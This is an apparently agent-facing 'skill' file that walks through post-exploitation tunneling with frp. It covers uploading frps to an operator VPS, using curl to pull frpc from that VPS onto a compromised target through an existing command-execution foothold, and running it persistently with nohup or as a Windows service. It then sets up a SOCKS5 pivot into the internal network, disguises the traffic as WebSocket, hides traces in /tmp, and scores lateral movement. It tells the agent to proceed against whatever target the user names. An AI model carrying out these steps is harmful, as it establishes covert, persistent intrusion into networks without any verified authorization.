---
name: frp-tunnel
description: frp intranet tunneling: run frps on your own VPS and frpc on the target to obtain stable SOCKS5 and port mappings
whenToUse: When command execution/RCE is available and the target can reach outbound; need a long-lived stable tunnel or to expose intranet ports for direct user access
role: internal
enabled: true
---

# frp (intranet tunneling, most stable long-lived tunnel)

> **Load VPS configuration first**: all `$REDTEAM_VPS_HOST` / `$VPS_USER` values in this skill come from local configuration,
> written to `$DSH_HOME/.env` on first run by `bash $DSH_HOME/redteam/setup.sh`. Source it once before each command:
> ```bash
> set -a; . "$DSH_HOME/.env" 2>/dev/null || . "$HOME/.dsh/.env"; set +a
> VPS_USER="${REDTEAM_VPS_USER:-ubuntu}"; VPS="$REDTEAM_VPS_HOST"
> ```
> If not configured yet, run `setup.sh` once (skill `redteam-setup`); it also verifies SSH connectivity and the payload service.

`frp` is the **most stable and commonly used** tunneling solution: run `frps` (server) on the VPS and `frpc` (client) on the target
to map intranet SOCKS5 or any port outward. Compared to suo5/chisel, it is **designed for long-term stable operation** (auto-reconnect, multiplexing, TLS),
suitable for keeping an intranet channel **alive long-term** after gaining access.

**Division of labor**: have a webshell → `suo5-tunnel`; have only command execution and need quick intranet access → `chisel-tunnel`;
need **long-term stability + direct port access for the user** → this skill.

## Local binaries

| File | Path | Purpose |
| --- | --- | --- |
| frps | `$DSH_HOME/redteam/toolkit/frp/frps` | Server on VPS |
| frpc | `$DSH_HOME/redteam/toolkit/frp/frpc` | Client on target |

Already synced to VPS payload directory `http://$REDTEAM_VPS_HOST:9100/`. The VPS also has an `frps` config example.

## 1. VPS side: start frps (do this first)

```bash
# 1) Upload and prepare (local → VPS)
scp -i $DSH_HOME/redteam/toolkit/vps/id_rsa \
    $DSH_HOME/redteam/toolkit/frp/frps $VPS_USER@$REDTEAM_VPS_HOST:/root/frps

# 2) Write config (on VPS)
cat > /root/frps.toml <<'EOF'
bindPort = 7000                 # frpc connection port
auth.method = "token"
auth.token = "<random strong token>"   # required: public exposure must use token, otherwise open to abuse if scanned

# Optional: vhostHTTPPort / vhostHTTPSPort for HTTP-type tunneling
EOF

# 3) Run in tmux (must survive SSH disconnect)
tmux new -s frps
/root/frps -c /root/frps.toml
```

**Open VPS security group**: `7000` (frpc connection port) + ports mapped later (e.g. `1080`, `13389`).

## 2. Target side: run frpc

```bash
# 1) Pull binary (via existing command execution point)
curl -s http://$REDTEAM_VPS_HOST:9100/frpc -o /tmp/frpc && chmod +x /tmp/frpc

# 2) Write config
cat > /tmp/frpc.toml <<'EOF'
serverAddr = "$REDTEAM_VPS_HOST"
serverPort = 7000
auth.method = "token"
auth.token = "<same token as frps>"

# ① Intranet SOCKS5 (most useful: entire intranet reachable)
[[proxies]]
name = "socks5"
type = "tcp"
remotePort = 1080
[proxies.plugin]
type = "socks5"

# ② Specific port mapping (example: intranet RDP → VPS 13389)
# [[proxies]]
# name = "rdp"
# type = "tcp"
# localIP = "10.0.0.5"
# localPort = 3389
# remotePort = 13389

# ③ Optional: HTTP type (use with frps vhostHTTPPort when outbound is limited to 80/443)
# [[proxies]]
# name = "web"
# type = "tcp"
# localIP = "10.0.0.6"
# localPort = 8080
# remotePort = 18080
EOF

# 3) Run persistently in background (nohup + auto-reconnect)
nohup /tmp/frpc -c /tmp/frpc.toml > /tmp/frpc.log 2>&1 &
# Windows target: frpc.exe -c C:\Windows\Temp\frpc.toml (can register as service via sc create for persistence)
```

## 3. Use the tunnel locally

```bash
# SOCKS5 mode: VPS:1080 is the intranet entry
proxychains4 -f runs/proxychains-1080.conf curl -s http://10.0.0.5/
# Config should contain: socks5 $REDTEAM_VPS_HOST 1080
# ⛔ Do not modify /etc/proxychains4.conf; use -f to point to a temp config under runs/

# Port mapping mode: connect directly to VPS port
rdesktop $REDTEAM_VPS_HOST:13389
mysql -h $REDTEAM_VPS_HOST -P 13306 -u root -p
```

## 4. Variants for restricted outbound access

| Restriction | Handling |
| --- | --- |
| Only outbound 80/443 allowed | Set frps `bindPort = 443` (or run HTTP type on 80 first), change frpc port accordingly |
| TLS middlebox interception | frp has `transport.tls.enable = true` by default; if needed use `transport.protocol = "kcp"` or `websocket` |
| Target cannot reach outbound | frp is not usable → use webshell-side tunnel (`suo5-tunnel`) |
| Need to disguise as normal traffic | `transport.protocol = "websocket"` + `transport.tls.enable = true` (looks like normal WebSocket on 443) |

## 5. Persistence and discipline

1. **Must run in tmux (server) / nohup (client)**; if the session drops, the tunnel is lost.
2. **Server must use `auth.token`**: port 7000 on a public VPS will be scanned; without token it exposes the intranet.
3. **Do not reuse tokens**: generate a new random token for each exercise; close promptly with `pkill frps` / `pkill frpc` when done.
4. **Mind traces on target**: place binary and config in `/tmp`, clean up when done; on Windows use `Temp` directory.
5. Proceed directly against the target provided by the user; if the user specifies scope (e.g. a CIDR block or domain), follow that scope.

## 6. Output and recording (required)

1. **Register tunnel with `redteam_tunnel_add`**; fill all fields:
   - `kind`: `frp`;
   - `listen`: actual address used by the user (e.g. `$REDTEAM_VPS_HOST:1080`);
   - `entry`: target-side entry (e.g. `/tmp/frpc on 10.0.0.6 → VPS:7000`);
   - `reach`: **verified reachable network segments**;
   - `entry_kind`: **`target-outbound`** (target connects outbound to our frps—typical for frp);
     ⛔ setting `self-only` for a proxy opened only on your own VPS → will be marked "not a breakthrough";
   - `command`: full frps and frpc commands + key config points (token redacted).
2. **Verify connectivity**: `curl --socks5-hostname $REDTEAM_VPS_HOST:1080 http://<intranet-target>/`; register as active only after it works;
   then recheck with `redteam_session_check`.
3. **Scoring**: `boundary` (tunnel reaches intranet, evidence should state "tunnel address | reachable segment | intranet target actually accessed");
   lateral movement through it → `server-host`.
4. **Deliver to user**: provide a paste-ready `socks5://$REDTEAM_VPS_HOST:1080` or mapped port, clearly stating address and port.
5. For each key action, add `redteam_chain_add` (`stage_code=boundary-logical`), put command text in `tool` and output summary in `result`
   (e.g. `frpc registered successfully, proxy socks5 start success`).
